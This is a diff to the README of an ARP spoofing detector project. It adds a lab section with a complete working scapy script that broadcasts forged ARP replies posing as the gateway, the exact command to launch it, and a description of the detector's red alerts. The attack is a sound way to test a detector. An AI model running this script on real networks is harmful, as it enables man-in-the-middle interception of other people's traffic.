@@ -61,18 +61,64 @@ STATIC_WHITELIST = {
 }
 ```
 
-## 📸 Screenshots & Attack Flow
+## 📸 Network Attack Simulation
 
-*(Waiting for screenshots. The standard flow usually involves a victim and an attacker machine using tools like `arpspoof` or `ettercap` on Ubuntu/VirtualBox. The detector script will flash a red alert when the MAC address for a known IP abruptly changes.)*
+To test the detector, we can deploy an ARP spoofing attack using Python and `scapy`. The following script simulates the behavior of tools like `arpspoof`.
 
-1. **Normal Network State:** The detector safely tracks ARP requests.
-   <!-- INSERT NORMAL STATE SCREENSHOT HERE -->
+### 1. The Attacker Script (`attacker.py`)
+This script crafts forged `Ether / ARP` packets and broadcasts them towards a specific target, falsely claiming that it (the attacker) holds the router's IP address.
 
-2. **Attack Initiated:** An attacker (e.g., from an Ubuntu VM) sends forged ARP replies.
-   <!-- INSERT ATTACK GENERATION SCREENSHOT HERE -->
+```python
+# attacker.py
+from scapy.all import ARP, Ether, sendp
+import time
+import argparse
 
-3. **Detection & Logging:** The detector catches the new conflicting MAC address and alerts the user.
-   <!-- INSERT ALERT SCREENSHOT HERE -->
+def main():
+    parser = argparse.ArgumentParser(description="ARP Spoofing Attacker Script")
+    parser.add_argument("-t", "--target", required=True, help="Target IP (e.g. Victim's IP)")
+    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP (e.g. Router IP)")
+    parser.add_argument("-m", "--mac", default="de:ad:be:ef:00:01", help="Fake MAC address to spoof")
+    args = parser.parse_args()
+
+    TARGET_IP = args.target
+    GATEWAY_IP = args.gateway
+    FAKE_MAC = args.mac
+
+    # Crafting the malicious ARP reply (op=2)
+    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+        op=2, pdst=TARGET_IP, hwdst="ff:ff:ff:ff:ff:ff", 
+        psrc=GATEWAY_IP, hwsrc=FAKE_MAC
+    )
+
+    print(f"Attacking {TARGET_IP}. Spoofing Gateway {GATEWAY_IP}...")
+    print("Sending forged ARP replies... Ctrl+C to stop")
+
+    while True:
+        sendp(pkt, verbose=False)
+        time.sleep(1)
+
+if __name__ == "__main__":
+    main()
+```
+
+### 2. Execution & Live Detection Flow
+
+Here is the exact flow of the attack and detection within an environment (For instance, using an Ubuntu VirtualBox attacker crossing paths with a Windows victim):
+
+#### Attacker Side (Ubuntu VM):
+The attacker runs the script to send continuous fake ARP replies toward the designated IP address, declaring a forged MAC address (`de:ad:be:ef:00:01`).
+```bash
+sudo python3 attacker.py -t 10.3.83.128 -g 10.3.0.1
+```
+*(Reference: Attacker begins blasting packets from their terminal into the network)*
+
+#### Victim Side / Detector (Windows):
+Meanwhile, the `ARP Spoof Detector` script is quietly monitoring network traffic. As soon as the malicious packets hit, the local caching system recognizes that the MAC address for Gateway `10.3.0.1` has abruptly changed from its known value to the fake `de:ad:be:ef:00:01`.
+
+The console immediately flags the violation in **bright red**, outputting the claimed IP, the historically known MAC, the fraudulent MAC, and a summary of the packed trigger.
+
+*(Reference: Multiple alerts populate the screen reading `[!] ARP SPOOF DETECTED`)*
 
 ## 📝 Logging
 
